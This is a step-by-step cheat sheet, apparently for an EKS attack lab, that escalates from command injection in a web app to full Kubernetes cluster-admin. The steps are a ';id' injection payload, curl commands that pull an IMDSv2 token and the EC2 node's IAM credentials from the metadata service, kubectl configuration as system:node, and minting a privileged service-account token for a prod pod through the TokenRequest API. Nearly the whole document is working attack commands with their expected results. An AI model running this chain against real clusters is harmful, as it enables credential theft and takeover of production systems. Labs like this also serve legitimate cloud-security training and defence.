# Scenario 1 — EKS Privilege Escalation Cheat Sheet

**RCE → IMDSv2 → Node Creds → Pod Impersonation → Cluster-Admin**

---

### Step 1 — Command Injection (RCE)

```
http://<LB_HOST>/check?host=;id
```

✅ Remote code execution inside the pod (as `appuser`)

---

### Step 2 — Get IMDSv2 Token

```bash
; TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && echo $TOKEN
```

✅ IMDSv2 session token (hop limit = 2 is commonly configured on EKS nodes)

---

### Step 3 — Steal EC2 Node IAM Credentials

```bash
# Get role name
; curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials
; curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```

✅ AWS AccessKeyId, SecretAccessKey, and Session Token for the EC2 node

---

### Step 4 — Get Instance ID + Recon Tags

```bash
# Instance ID (from RCE)
; curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/instance-id

# EC2 tags (from attacker machine with stolen creds)
aws ec2 describe-tags --filters "Name=resource-id,Values=<INSTANCE_ID>" --output table
```

✅ Know which node we're on + discover prod workloads share this node

---

### Step 5 — Set Stolen Creds on Attacker Machine

```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
export AWS_SESSION_TOKEN="<Token>"
aws sts get-caller-identity
```

✅ Confirmed identity as the EKS worker node IAM role

---

### Step 6 — Exchange IAM Creds for EKS Token

```bash
EKS_TOKEN=$(aws eks get-token --cluster-name eks-attacks-lab | jq -r '.status.token')
```

✅ Kubernetes bearer token with `system:node` privileges

---

### Step 7 — Configure kubectl as Node

```bash
EKS_EP=$(aws eks describe-cluster --name eks-attacks-lab --query 'cluster.endpoint' --output text)
EKS_CA=$(aws eks describe-cluster --name eks-attacks-lab --query 'cluster.certificateAuthority.data' --output text)

kubectl config set-cluster attack-cluster --server="$EKS_EP"
echo "$EKS_CA" | base64 -d > /tmp/eks-ca.crt
kubectl config set-cluster attack-cluster --certificate-authority=/tmp/eks-ca.crt
kubectl config set-credentials attack-node --token="$EKS_TOKEN"
kubectl config set-context attack --cluster=attack-cluster --user=attack-node
kubectl config use-context attack

# Confirm identity — Username shows system:node:<node-name>
kubectl auth whoami
```

✅ kubectl authenticated as `system:node` — the node name is in the Username field

---

### Step 8 — Find Target Pod on Same Node

```bash
# Extract node name from kubectl auth whoami (system:node:<node-name>)
NODE_NAME=$(kubectl auth whoami -o jsonpath='{.status.userInfo.username}' | sed 's/system:node://')
kubectl get pods --all-namespaces -o wide --field-selector spec.nodeName=$NODE_NAME
```

✅ Discovered `payment-processor` pod in `prod` namespace on our node

---

### Step 9 — Enumerate Service Account

```bash
kubectl get -n prod pod/payment-processor -o jsonpath='{.spec.serviceAccountName}'
# prod-admin-sa
```

✅ Found a potentially privileged service account bound to the pod

---

### Step 10 — Get Pod UID

```bash
POD_UID=$(kubectl get pod payment-processor -n prod -o jsonpath='{.metadata.uid}')
```

✅ Got the bound-object UID needed for token request

---

### Step 11 — Request Service Account Token (the escalation)

```bash
SA_TOKEN=$(kubectl create token prod-admin-sa -n prod \
  --bound-object-kind=Pod \
  --bound-object-name=payment-processor \
  --bound-object-uid="$POD_UID")
```

✅ NodeRestriction allows this — node can request tokens for any pod on itself

---

### Step 12 — Pivot to Cluster-Admin & Verify Permissions

```bash
# Save token to file or use directly with --token
echo "$SA_TOKEN" > token

# List all permissions cluster-wide with the new token
kubectl auth can-i --list --token=$(cat token)

# Quick verification for full cluster takeover
kubectl auth can-i '*' '*' --token=$(cat token)
# yes

# Update your kubectl credentials to use it permanently
kubectl config set-credentials attack-node --token="$SA_TOKEN"
```

✅ **Full cluster-admin access verified — cluster compromised**

---

### Summary

| Step | What | How |
|------|------|-----|
| 1 | RCE | Command injection in web app |
| 2–3 | Steal node creds | IMDSv2 from pod (hop limit = 2, common config) |
| 4 | Recon | EC2 tags reveal prod workloads |
| 5–7 | Become system:node | IAM creds → EKS token → kubectl |
| 8 | Find target pod | `--field-selector spec.nodeName=` lists pods on our node |
| 9 | Enumerate SA | Get service account name from the pod |
| 10 | Get pod UID | Needed for bound-object token request |
| 11 | Impersonate SA | TokenRequest API (allowed by NodeRestriction) |
| 12 | Cluster-admin | prod SA has ClusterRoleBinding to cluster-admin |
